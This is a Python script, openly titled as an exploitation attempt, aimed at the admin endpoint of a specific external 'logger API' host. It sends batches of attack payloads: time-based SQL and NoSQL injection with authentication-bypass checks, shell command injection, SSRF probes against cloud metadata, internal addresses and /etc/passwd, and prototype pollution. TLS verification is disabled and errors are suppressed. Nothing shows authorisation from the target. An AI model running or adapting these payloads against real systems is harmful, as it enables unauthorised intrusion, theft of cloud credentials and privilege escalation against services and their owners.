#!/usr/bin/env python3
"""
The logger API at api.ffbbbdc6d3c353211fe2ba39c9f744cd.com/p/
returns 500 errors - let's try to exploit it
"""
import requests
import time

requests.packages.urllib3.disable_warnings()

base = "https://api.ffbbbdc6d3c353211fe2ba39c9f744cd.com"

print("="*80)
print("EXPLOITING LOGGER API - 500 ERROR ANALYSIS")
print("="*80)

# Test 1: Blind SQL Injection via time delays
print("\n[1] TESTING BLIND SQL INJECTION (TIME-BASED)")
print("-"*80)

sqli_payloads = [
    {"test": "1' AND SLEEP(5)--"},
    {"test": "1' WAITFOR DELAY '00:00:05'--"},
    {"test": "1'; SELECT pg_sleep(5)--"},
    {"test": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"},
]

for payload in sqli_payloads:
    try:
        start = time.time()
        r = requests.post(f"{base}/p/admin", json=payload, timeout=10, verify=False)
        elapsed = time.time() - start
        
        print(f"\nPayload: {payload}")
        print(f"  Time: {elapsed:.2f}s, Status: {r.status_code}")
        
        if elapsed > 4.5:
            print(f"  üö® DELAY DETECTED - Possible SQL injection!")
            print(f"  Response: {r.text[:200]}")
    except requests.Timeout:
        print(f"  ‚è±Ô∏è  TIMEOUT - Strong indicator of SQLi")
    except Exception as e:
        pass

# Test 2: NoSQL Injection
print("\n\n[2] TESTING NOSQL INJECTION")
print("-"*80)

nosql_payloads = [
    {"user": {"$ne": None}, "pass": {"$ne": None}},
    {"user": {"$gt": ""}, "pass": {"$gt": ""}},
    {"$where": "sleep(5000)"},
    {"user": {"$regex": ".*"}},
]

for payload in nosql_payloads:
    try:
        start = time.time()
        r = requests.post(f"{base}/p/admin", json=payload, timeout=10, verify=False)
        elapsed = time.time() - start
        
        print(f"\nPayload: {str(payload)[:80]}")
        print(f"  Time: {elapsed:.2f}s, Status: {r.status_code}")
        print(f"  Response: {r.text[:200]}")
        
        # Check for auth bypass
        if r.status_code == 200 and "success" in r.text.lower():
            print(f"  üö®üö®üö® AUTHENTICATION BYPASS!")
        
        if elapsed > 4:
            print(f"  ‚ö†Ô∏è  Delay - possible NoSQL injection")
    except:
        pass

# Test 3: Command Injection
print("\n\n[3] TESTING COMMAND INJECTION")
print("-"*80)

cmd_payloads = [
    {"cmd": "; sleep 5"},
    {"cmd": "| sleep 5"},
    {"cmd": "$(sleep 5)"},
    {"input": "; ping -c 5 127.0.0.1"},
]

for payload in cmd_payloads:
    try:
        start = time.time()
        r = requests.post(f"{base}/p/admin", json=payload, timeout=10, verify=False)
        elapsed = time.time() - start
        
        print(f"\nPayload: {payload}")
        print(f"  Time: {elapsed:.2f}s, Status: {r.status_code}")
        
        if elapsed > 4:
            print(f"  üö® DELAY - Possible command injection!")
            
    except:
        pass

# Test 4: SSRF
print("\n\n[4] TESTING SSRF")
print("-"*80)

ssrf_payloads = [
    {"url": "http://169.254.169.254/latest/meta-data/"},
    {"url": "http://10.110.185.208:30859"},  # Internal IP from JS
    {"url": "http://127.0.0.1:22"},
    {"url": "file:///etc/passwd"},
    {"webhook": "http://169.254.169.254/"},
]

for payload in ssrf_payloads:
    try:
        r = requests.post(f"{base}/p/admin", json=payload, timeout=5, verify=False)
        print(f"\nPayload: {payload}")
        print(f"  Status: {r.status_code}, Length: {len(r.text)}")
        
        # Check for AWS metadata
        if "ami-" in r.text or "iam" in r.text.lower():
            print(f"  üö®üö®üö® SSRF TO AWS METADATA!")
            print(f"  Response: {r.text}")
            
        # Check for internal service response
        if len(r.text) > 100 and r.status_code != 500:
            print(f"  ‚ö†Ô∏è  Got response - possible SSRF")
            print(f"  Response: {r.text[:300]}")
    except:
        pass

# Test 5: Prototype Pollution
print("\n\n[5] TESTING PROTOTYPE POLLUTION")
print("-"*80)

pollution_payloads = [
    {"__proto__": {"admin": True}},
    {"constructor": {"prototype": {"admin": True}}},
    {"__proto__": {"isAdmin": 1}},
]

for payload in pollution_payloads:
    try:
        r = requests.post(f"{base}/p/admin", json=payload, timeout=5, verify=False)
        print(f"\nPayload: {str(payload)[:80]}")
        print(f"  Status: {r.status_code}")
        
        # Send second request to check if pollution worked
        r2 = requests.post(f"{base}/p/admin", json={}, timeout=5, verify=False)
        if r2.status_code != r.status_code or r2.text != r.text:
            print(f"  ‚ö†Ô∏è  Second request differs - possible pollution effect")
            print(f"  Second response: {r2.text[:200]}")
    except:
        pass

print("\n" + "="*80)
print("LOGGER API EXPLOITATION COMPLETE")
print("="*80)
